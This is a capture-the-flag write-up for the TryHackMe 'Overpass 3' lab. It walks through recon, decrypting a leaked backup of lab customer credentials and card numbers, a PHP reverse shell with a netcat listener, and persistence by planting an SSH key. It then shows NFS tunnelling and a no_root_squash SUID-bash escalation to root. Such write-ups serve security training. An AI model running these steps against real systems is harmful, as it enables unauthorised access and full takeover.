# Overpass 3 - Hosting

**Room link:** https://tryhackme.com/room/overpass3hosting

_A sequel to the easier [Overpass](https://tryhackme.com/room/overpass) and [Overpass 2](https://tryhackme.com/room/overpass2hacked) rooms._

1. `nmap` reveals FTP, SSH and HTTP services on default ports.

2. `gobuster` on the website reveals a hidden `backups` directory containing a `backup.zip` file. This archive contains an encrypted `CustomerDetails.xlsx.gpg` file and a PGP private key `priv.key`. Let us decrypt.

```
$ gpg --import priv.key
...
$ gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
```

Open the file, e.g. using LibreOffice, and export is as CSV.

```
$ cat CustomerDetails.csv         
Customer Name,Username,Password,Credit card number,CVC
Par. A. Doxx,paradox,****REDACTED*****,4111 1111 4555 1142,432
0day Montgomery,0day,OllieIsTheBestDog,5555 3412 4444 1115,642
Muir Land,muirlandoracle,A11D0gsAreAw3s0me,5103 2219 1119 9245,737
```

We get some credentials.

3. Trying these credentials, we gain access to the FTP as `paradox`. This gives us access to the website directory with `rwx` rights on its root directory! Upload a PHP reverse shell, get in (as `apache`) and grab the **web flag**.

```
$ nc -lnp 4444 
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:13:16 up  1:39,  0 users,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (852): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ find / -name '*flag*' -type f 2> /dev/null
...
/usr/share/httpd/web.flag
sh-4.4$ cat /usr/share/httpd/web.flag
**REDACTED**
```

4. There seems to be two interesting users on the machine: `james` and `paradox`. Upgrade the terminal and simply log in as `paradox` using the same password as before.

```
sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
$ stty raw -echo; fg
bash-4.4$ su paradox
Password: 
[paradox@localhost /]$ cd
[paradox@localhost ~]$ ls -la
total 56
drwx------. 4 paradox paradox   203 Nov 18 18:29 .
drwxr-xr-x. 4 root    root       34 Nov  8 19:34 ..
-rw-rw-r--. 1 paradox paradox 13353 Nov  8 21:23 backup.zip
lrwxrwxrwx. 1 paradox paradox     9 Nov  8 21:45 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 paradox paradox 10019 Nov  8 20:37 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox 10366 Nov  8 21:18 CustomerDetails.xlsx.gpg
drwx------. 4 paradox paradox   132 Nov  8 21:18 .gnupg
-rw-------. 1 paradox paradox  3522 Nov  8 21:16 priv.key
drwx------  2 paradox paradox    47 Nov 18 18:32 .ssh
[paradox@localhost ~]$ ls -la .ssh/
total 8
drwx------  2 paradox paradox  47 Nov 18 18:32 .
drwx------. 4 paradox paradox 203 Nov 18 18:29 ..
-rw-------  1 paradox paradox 583 Nov 18 18:29 authorized_keys
-rw-r--r--  1 paradox paradox 583 Nov 18 18:29 id_rsa.pub
```

Let us upload our own SSH public key to the target, e.g. using the FTP access (to write into `/var/www/html/`), and add it to `paradox`' `authorized_keys`.

```
[paradox@localhost ~]$ mv /var/www/html/id_rsa.pub .ssh/
[paradox@localhost ~]$ cd .ssh 
[paradox@localhost .ssh]$ cat id_rsa.pub >> authorized_keys
```

We now have a proper SSH access to the target as `paradox`.

5. Using an enumeration script (e.g. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) uploaded using `scp`), we discover that `james`' home directory is a NFS share with the infamous `no_root_squash` option.

```
[paradox@localhost ~]$ cat /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

Unfortunately the NFS server is not accessible from outside...

6. But we can SSH-tunnel the NFS server ports. First of all, identify these ports.

```
[paradox@localhost ~]$ rpcinfo -p | egrep 'tcp.+(mountd|nfs)'
    100005    1   tcp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
```

Then on our local machine, create an SSH tunnel linking target ports 2049 (default NFS) and 20048 to some local ports (6000 and 6001 here). Mount the NFS share and grab the **user flag**.

```
$ ssh -fNv -L 6000:$TARGET_IP:2049 -L 6001:$TARGET_IP:20048 paradox@$TARGET_IP
...
$ mkdir /tmp/nfs
$ sudo mount -t nfs -o port=6000,mountport=6001,tcp localhost:/home/james /tmp/nfs
...
$ cd /tmp/nfs 
$ cat user.flag
**REDACTED**
```

7. At this point, we have access to `james`' private key `/tmp/nfs/.ssh/id_rsa` and could use it to log in as `james` through SSH, but we do not actually need to be that subtle. Let us simply become `root` locally, open `james`' home to everyone and copy our own `bash` there to give it SUID.

```
$ sudo su
# chown root /tmp/nfs
# chgrp root /tmp/nfs
# chmod +rwx /tmp/nfs
# cp /bin/bash /tmp/nfs/rootbash
# chmod +s /tmp/nfs/rootbash
```

Then still as `paradox` on the target, become `root` and grab the **root flag**.

```
[paradox@localhost home]$ /home/james/rootbash -p
rootbash-5.0# cat /root/root.flag 
**REDACTED**
```


## Cleaning

Delete the imported PGP keys.

```
$ gpg --list-keys
...
pub   rsa2048 2020-11-08 [SC] [expire : 2022-11-08]
      49829BBEB100BB2692F33CD2C9AE71AB3180BC08
uid          [ inconnue] Paradox <paradox@overpass.thm>
sub   rsa2048 2020-11-08 [E] [expire : 2022-11-08]

$ gpg --delete-secret-and-public-keys 49829BBEB100BB2692F33CD2C9AE71AB3180BC08
```

Unmount the NFS share (use option `-f` if the connection was lost).

```
$ sudo umount /tmp/nfs
```

Kill the SSH tunnel.

```
$ ps -ef | grep ssh
...
*******    44066       1  0 16:51 ?        00:00:00 ssh -fNv -L 6000:10.10.**.***:2049 -L 6001:10.10.**.***:20048 paradox@10.10.**.***
...
$ kill 44066
```
